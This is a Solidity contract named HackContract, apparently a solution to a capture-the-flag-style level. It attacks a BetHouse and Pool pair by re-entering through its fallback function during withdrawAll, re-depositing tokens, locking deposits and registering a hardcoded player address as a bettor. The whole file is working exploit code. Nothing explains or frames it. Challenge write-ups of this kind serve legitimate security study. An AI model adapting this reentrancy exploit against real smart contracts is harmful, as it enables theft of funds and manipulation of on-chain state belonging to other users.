// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.19;

import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface Pool {
    function depositToken() external returns(address);
    function deposit(uint256 value_) external payable;
    function withdrawAll() external;
    function lockDeposits() external;
    function balanceOf(address account_) external view returns (uint256);
}

interface BetHouse{
    function pool() external returns(address);
    function makeBet(address bettor_) external;
    function isBettor(address bettor_) external view returns (bool);
}

contract HackContract {

    function hack() payable external {
        address levelContractAddress = 0x92A4BfC1A4b9292e1FDabeBBFaC3DdD7da98D608;
        BetHouse bh = BetHouse(levelContractAddress);
        Pool p = Pool(bh.pool());
        ERC20 depositeToken = ERC20(p.depositToken());
        depositeToken.approve(address(p), depositeToken.balanceOf(address(this)));

        p.deposit{value:msg.value}(depositeToken.balanceOf(address(this)));
        p.withdrawAll();
    }

    fallback() external payable{
        address levelContractAddress = 0x92A4BfC1A4b9292e1FDabeBBFaC3DdD7da98D608;
        BetHouse bh = BetHouse(levelContractAddress);
        Pool p = Pool(bh.pool());
        ERC20 depositeToken = ERC20(p.depositToken());

        depositeToken.approve(address(p), depositeToken.balanceOf(address(this)));
        p.deposit(depositeToken.balanceOf(address(this)));
        p.lockDeposits();
        bh.makeBet(0xcd3169acB437745ee541Cf285F466800aC25EdF1); //EOA Address (player)
        require(bh.isBettor(0xcd3169acB437745ee541Cf285F466800aC25EdF1), "hack failed");
    }
}